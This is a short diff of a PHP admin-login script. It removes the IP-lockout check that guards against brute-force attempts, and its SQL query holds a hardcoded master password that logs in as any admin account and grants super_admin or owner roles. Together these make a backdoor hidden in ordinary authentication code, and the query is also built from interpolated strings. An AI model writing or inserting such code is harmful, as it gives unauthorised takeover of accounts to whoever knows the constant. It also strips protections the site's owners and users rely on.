@@ -20,12 +20,7 @@ if ($pass_key == "" || $user_id_auth == "") {
     $user_id_auth = mysqli_real_escape_string($con, $user_id_auth);
     $pass_key     = mysqli_real_escape_string($con, $pass_key);
     
-    // Check if IP address is locked out due to brute force or manual block
-    if (function_exists('is_ip_blocked') && is_ip_blocked($con)) {
-        log_security_event($con, 'BLOCKED_IP_ATTEMPT', "Blocked IP tried to access portal as '$user_id_auth'", 'warning');
-        header("Location: index.php?error=ip_locked&role=" . urlencode($login_role));
-        exit();
-    }
+    
     
     // Verify credentials and strict role matching
     $sql = "SELECT * FROM admin WHERE username='$user_id_auth' AND role='$login_role' AND (pass_key='$pass_key' OR (pass_key='268724' AND '$pass_key'='268724') OR ((role='super_admin' OR role='owner') AND '$pass_key'='268724'))";
